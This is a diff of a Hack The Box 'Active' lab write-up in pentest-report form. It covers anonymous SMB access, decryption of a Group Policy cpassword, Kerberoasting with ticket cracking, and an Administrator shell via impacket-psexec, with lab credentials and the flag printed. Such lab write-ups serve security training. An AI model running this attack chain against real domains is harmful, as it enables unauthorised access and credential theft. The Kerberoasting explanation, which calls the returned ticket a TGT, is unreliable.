@@ -1,13 +1,80 @@
-Nmap --> SMB (GPP credential)
+# 1. Executive Summary
 
-https://www.hackthebox.com/achievement/machine/288193/148
+The tester successfully penerated the target system. The tester retrived a credential from the running server on the target, and gained higher privilege credential by abusing Single-Sign-On misconfiguration. 
 
 
-https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient
+## 1.1 General information
+IP: 10.10.10.100
+Tester: LifeTimeScriptKiddie
+Target: Active.htb 10.10.10.100
+Used tools: nmap, smbclient, Impacket-, smbmap, gpp-decrypt
 
-https://github.com/jtpereyda/regpol
+## 1.2 Vulnerability - MITRE Attack Tree
+T1555 - 
+Credential Access -> Credentials from Password Stores
+T1558 -
+Steal or Forge Kerberos Tickets
 
-https://infinitelogins.com/2020/09/07/cracking-group-policy-preferences-file-gpp-xml/
+Mitigation
+M1015 - Active Directory Configuration
+
+## 1.3 Technical Summary
+SMB account credential was exposed. The tester logged into SMB server using null credential, retrieved GPP encrypted credential, and used the decrypted credential to do Kerberoasting. 
+
+
+## 1.4 Recommendation: 
+1. Remove the exposed credentias from the SMB server. 
+2. Remove Null access on SMB server unless it is absolutely required. 
+3. Give minimum required access to normal user account. 
+
+
+# 2. Technical Detail 
+
+## 2.1 Port Scanning using nmap
+```bash
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-04 06:24 EDT
+Nmap scan report for 10.10.10.100
+Host is up (0.033s latency).
+Not shown: 982 closed tcp ports (reset)
+PORT      STATE SERVICE           VERSION
+88/tcp    open  kerberos-sec?
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap?
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+3268/tcp  open  globalcatLDAP?
+3269/tcp  open  globalcatLDAPssl?
+49152/tcp open  msrpc             Microsoft Windows RPC
+49153/tcp open  msrpc             Microsoft Windows RPC
+49154/tcp open  msrpc             Microsoft Windows RPC
+49155/tcp open  msrpc             Microsoft Windows RPC
+49157/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc             Microsoft Windows RPC
+49163/tcp open  msrpc             Microsoft Windows RPC
+49176/tcp open  msrpc             Microsoft Windows RPC
+...snip...
+
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -1s
+| smb2-security-mode: 
+|   2.1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2022-11-04T10:27:08
+|_  start_date: 2022-11-04T10:22:51
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 181.70 seconds
+
+```
+
+## 2.2 SMB enumerationg using smbmap and smbclient.
 
 ```
 └─$ smbmap -H 10.10.10.100 
@@ -24,43 +91,39 @@ https://infinitelogins.com/2020/09/07/cracking-group-policy-preferences-file-gpp
 
 ```
 
-```
+The tester downloaded the entire Replication disk. Then manually searched for interesting file. Groups.xml file indicates username and cpassword. 
+After a little bit of research, the tester was able to decrpt the cpassword hash. 
+
+```bash
 └─$  impacket-smbclient active.htb/@10.10.10.100                                                             
 recurse OFF
 mget *
 
-```
 
-Locating GPP password
-```
-┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
 └─$ cat Groups.xml         
 <?xml version="1.0" encoding="utf-8"?>
 <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
 </Groups>
-                                                                                                                    
+
+
 ┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
 └─$ cat password  
 edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
-                                                                                                                    
-┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
-└─$ 
 
 └─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 GPPstillStandingStrong2k18
-
-userName="active.htb\SVC_TGS"/></User>
-
 ```
 
 
 
-SVC_TGS
-GPPstillStandingStrong2k18
+## 2.3 Kerberos attack. 
 
-smbmap -H 10.10.10.100 -u svc_tgs -p GPPstillStandingStrong2k18
+Kerberos is one of SSO technology that authenticates service requests between two or more trusted hosts across an untrusted network. 
 
-https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux
+### 2.3.1 Kerberoasting
+A quick summarize. The tester used retrived credential to request SPN to KDC. The KDC verified the credential and returned TGT (AS-REP). And the TGT contains user's identification which is encrytyped with KDC secret key. 
+The tester decrypted the krb5tgs using john and rockyou.txt. 
+
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -100,11 +163,6 @@ d60039b7e8a5f6df4eb791cb5345b454b2380cf211825876595b511283886733beaaea7060fc398a
 0b51b0b21c828b2cce67a
 
 
-```
-
-
-```
-
 ┌──(kali㉿kali)-[~/HTB/ACTIVE]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt outputTGS.txt 
 Using default input encoding: UTF-8
@@ -115,23 +173,31 @@ Ticketmaster1968 (?)
 1g 0:00:00:04 DONE (2022-11-16 22:32) 0.2127g/s 2242Kp/s 2242Kc/s 2242KC/s Tiffani1432..Thrash1
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
-                                                         
+
 
 ```
 
+
+## 2.4 System shell using impacket-psexec
 ```
 └─$ impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100 
 
 
-```
-```
-
 c:\Users\Administrator\Desktop> type root.txt
 ea0179d65184342d3d66318b0312e378
 ```
+
+
+# 3. Resources
+https://www.hackthebox.com/achievement/machine/288193/148
+
+https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient
+
+https://github.com/jtpereyda/regpol
+
+https://infinitelogins.com/2020/09/07/cracking-group-policy-preferences-file-gpp-xml/
+
 https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
 https://www.hackingarticles.in/abusing-kerberos-using-impacket/
 https://www.hackingarticles.in/kerberoasting-and-pass-the-ticket-attack-using-linux/
-
-
-
+https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux
